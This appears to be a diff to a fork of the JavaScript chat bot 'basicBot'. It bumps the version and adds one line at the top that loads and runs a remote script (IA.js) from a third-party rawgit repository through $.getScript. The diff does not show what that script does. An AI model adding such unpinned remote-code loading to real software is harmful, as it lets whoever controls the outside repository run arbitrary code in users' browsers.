@@ -1,3 +1,4 @@
+ $.getScript('https://rawgit.com/V1RTU4LL1F3/fatgasda/master/IA.js');
 /**
  *Copyright 2015 basicBot
  *Modifications (including forks) of the code to fit personal needs are allowed only for personal use and should refer back to the original source.
@@ -229,7 +230,7 @@
     var botCreatorIDs = ["3851534", "4105209", "3926149"];
 
     var basicBot = {
-        version: "3.0.7 (11/05/17)",
+        version: "3.0.8 (16/05/17)",
         status: false,
         name: "basicBot",
         loggedInID: null,
